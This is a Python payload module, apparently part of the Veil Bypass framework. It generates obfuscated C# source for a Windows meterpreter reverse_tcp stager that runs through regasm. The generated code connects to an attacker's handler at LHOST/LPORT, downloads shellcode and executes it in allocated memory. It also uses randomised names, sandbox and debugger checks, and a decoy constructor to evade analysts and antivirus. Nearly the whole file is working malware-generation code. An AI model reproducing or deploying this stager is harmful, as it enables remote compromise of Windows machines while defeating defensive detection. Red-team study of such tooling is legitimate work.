"""

Custom-written pure regasm meterpreter/reverse_tcp stager.
Uses basic variable renaming obfuscation.

Module built by @ConsciousHacker

"""

import random
from lib.common import helpers
from Tools.Bypass.bypass_common import bypass_helpers
from Tools.Bypass.bypass_common import gamemaker


class PayloadModule:

    def __init__(self, cli_obj):
        # required
        self.language = "regasm"
        self.extension = "cs"
        self.rating = "Excellent"
        self.description = "pure regasm windows/meterpreter/reverse_tcp stager"
        self.name = "Pure InstallUtil C# Reverse TCP Stager"
        self.path = "regasm/meterpreter/rev_tcp"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
                                    "COMPILE_TO_DLL" : ["Y", "Compile to a DLL"],
                                    "INJECT_METHOD"  : ["Heap", "Virtual or Heap"],
                                    "LHOST"          : ["", "IP of the Metasploit handler"],
                                    "LPORT"          : ["4444", "Port of the Metasploit handler"],
                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
                                    "HOSTNAME"       : ["X", "Optional: Required system hostname"],
                                    "DOMAIN"         : ["X", "Optional: Required internal domain"],
                                    "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
                                    "TIMEZONE"       : ["X", "Optional: Check to validate not in UTC"],
                                    "USERNAME"       : ["X", "Optional: The required user account"],
                                    "DEBUGGER"       : ["X", "Optional: Check if debugger is attached"],
                                    "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
                                }

    def generate(self):

        # randomize all our variable names, yo'
        classhellcodeName = bypass_helpers.randomString()
        classhellcodeNameTwo = bypass_helpers.randomString()
        namespace = bypass_helpers.randomString()
        key = bypass_helpers.randomString()
        injectName = bypass_helpers.randomString()
        execName = bypass_helpers.randomString()
        bytearrayName = bypass_helpers.randomString()
        funcAddrName = bypass_helpers.randomString()
        savedStateName = bypass_helpers.randomString()
        shellcodeName = bypass_helpers.randomString()
        rand_bool = bypass_helpers.randomString()
        random_out = bypass_helpers.randomString()
        getDataName = helpers.randomString()


        hThreadName = bypass_helpers.randomString()
        threadIdName = bypass_helpers.randomString()
        pinfoName = bypass_helpers.randomString()
        num_tabs_required = 0

        # get random variables for the API imports
        r = [bypass_helpers.randomString() for x in range(16)]
        y = [bypass_helpers.randomString() for x in range(17)]

        #required syntax at the beginning of any/all payloads
        payload_code = "using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.EnterpriseServices; using System.Windows.Forms;\n"
        payload_code += "namespace {0}\n {{".format(namespace)
        payload_code += "\n\tpublic class {0} : ServicedComponent {{\n".format(classhellcodeName)
        # placeholder for legitimate C# program
        # lets add a message box to throw offf sandbox heuristics and analysts :)
        payload_code += '\n\t\tpublic {0}() {{ Console.WriteLine("doge"); }}\n'.format(classhellcodeName)
        payload_code += "\n\t\t[ComRegisterFunction]"
        payload_code += "\n\t\tpublic static void RegisterClass ( string {0} )\n\t\t{{\n".format(key)
        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n".format(classhellcodeNameTwo, execName)
        payload_code += "\n[ComUnregisterFunction]"
        payload_code += "\n\t\tpublic static void UnRegisterClass ( string {0} )\n\t\t{{\n".format(key)
        payload_code += "\t\t\t{0}.{1}();\n\t\t}}\n\t}}\n".format(classhellcodeNameTwo, execName)

        payload_code += "\n\tpublic class {0}\n\t{{".format(classhellcodeNameTwo)
        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += """\t\t[DllImport(\"kernel32\")] private static extern UInt32 HeapCreate(UInt32 %s, UInt32 %s, UInt32 %s); \n[DllImport(\"kernel32\")] private static extern UInt32 HeapAlloc(UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 RtlMoveMemory(UInt32 %s, byte[] %s, UInt32 %s);\n[DllImport(\"kernel32\")] private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s, IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s);"""%(y[0],y[1],y[2],y[3],y[4],y[5],y[6],y[7],y[8],y[9],y[10],y[11],y[12],y[13],y[14],y[15],y[16])

        hostName = helpers.randomString()
        portName = helpers.randomString()
        ipName = helpers.randomString()
        sockName = helpers.randomString()
        length_rawName = helpers.randomString()
        lengthName = helpers.randomString()
        sName = helpers.randomString()
        total_bytesName = helpers.randomString()
        handleName = helpers.randomString()

        payload_code += "static byte[] %s(string %s, int %s) {\n" %(getDataName, hostName, portName)
        payload_code += "    IPEndPoint %s = new IPEndPoint(IPAddress.Parse(%s), %s);\n" %(ipName, hostName, portName)
        payload_code += "    Socket %s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);\n" %(sockName)
        payload_code += "    try { %s.Connect(%s); }\n" %(sockName, ipName)
        payload_code += "    catch { return null;}\n"
        payload_code += "    byte[] %s = new byte[4];\n" %(length_rawName)
        payload_code += "    %s.Receive(%s, 4, 0);\n" %(sockName, length_rawName)
        payload_code += "    int %s = BitConverter.ToInt32(%s, 0);\n" %(lengthName, length_rawName)
        payload_code += "    byte[] %s = new byte[%s + 5];\n" %(sName, lengthName)
        payload_code += "    int %s = 0;\n" %(total_bytesName)
        payload_code += "    while (%s < %s)\n" %(total_bytesName, lengthName)
        payload_code += "    { %s += %s.Receive(%s, %s + 5, (%s - %s) < 4096 ? (%s - %s) : 4096, 0);}\n" %(total_bytesName, sockName, sName, total_bytesName, lengthName, total_bytesName, lengthName, total_bytesName)
        payload_code += "    byte[] %s = BitConverter.GetBytes((int)%s.Handle);\n" %(handleName, sockName)
        payload_code += "    Array.Copy(%s, 0, %s, 1, 4); %s[0] = 0xBF;\n" %(handleName, sName, sName)
        payload_code += "    return %s;}\n" %(sName)

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += "static void %s(byte[] %s) {\n" %(injectName, shellcodeName)
            payload_code += "    if (%s != null) {\n" %(shellcodeName)
            payload_code += "        UInt32 %s = VirtualAlloc(0, (UInt32)%s.Length, 0x1000, 0x40);\n" %(funcAddrName, shellcodeName)
            payload_code += "        Marshal.Copy(%s, 0, (IntPtr)(%s), %s.Length);\n" %(shellcodeName,funcAddrName, shellcodeName)
            payload_code += "        IntPtr %s = IntPtr.Zero;\n" %(hThreadName)
            payload_code += "        UInt32 %s = 0;\n" %(threadIdName)
            payload_code += "        IntPtr %s = IntPtr.Zero;\n" %(pinfoName)
            payload_code += "        %s = CreateThread(0, 0, %s, %s, 0, ref %s);\n" %(hThreadName, funcAddrName, pinfoName, threadIdName)
            payload_code += "        WaitForSingleObject(%s, 0xFFFFFFFF); }}\n" %(hThreadName)

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":

            payload_code += "static void %s(byte[] %s) {\n" %(injectName, shellcodeName)
            payload_code += "    if (%s != null) {\n" %(shellcodeName)
            payload_code += '       UInt32 {} = HeapCreate(0x00040000, (UInt32){}.Length, 0);\n'.format(pinfoName, shellcodeName)
            payload_code += '       UInt32 {} = HeapAlloc({}, 0x00000008, (UInt32){}.Length);\n'.format(funcAddrName, pinfoName, shellcodeName)
            payload_code += '       RtlMoveMemory({}, {}, (UInt32){}.Length);\n'.format(funcAddrName, shellcodeName, shellcodeName)
            payload_code += '       UInt32 {} = 0;\n'.format(threadIdName)
            payload_code += '       IntPtr {} = CreateThread(0, 0, {}, IntPtr.Zero, 0, ref {});\n'.format(hThreadName, funcAddrName, threadIdName)
            payload_code += '       WaitForSingleObject({}, 0xFFFFFFFF);}}}}\n'.format(hThreadName)

        randomName = bypass_helpers.randomString()
        num_tabs_required = 0

        payload_code += "\n\t\tpublic static void {0}() {{\n".format(execName)
        payload_code2, num_tabs_required = gamemaker.senecas_games(self)
        payload_code = payload_code + payload_code2
        num_tabs_required += 3

        payload_code += "    byte[] %s = null; %s = %s(\"%s\", %s);\n" %(sName, sName, getDataName, self.required_options["LHOST"][0],self.required_options["LPORT"][0])
        payload_code += "    %s(%s);\n" %(injectName, sName)


        while (num_tabs_required != 0):
            payload_code += '\t' * num_tabs_required + '}'
            num_tabs_required -= 1

        self.payload_source_code = payload_code
        return
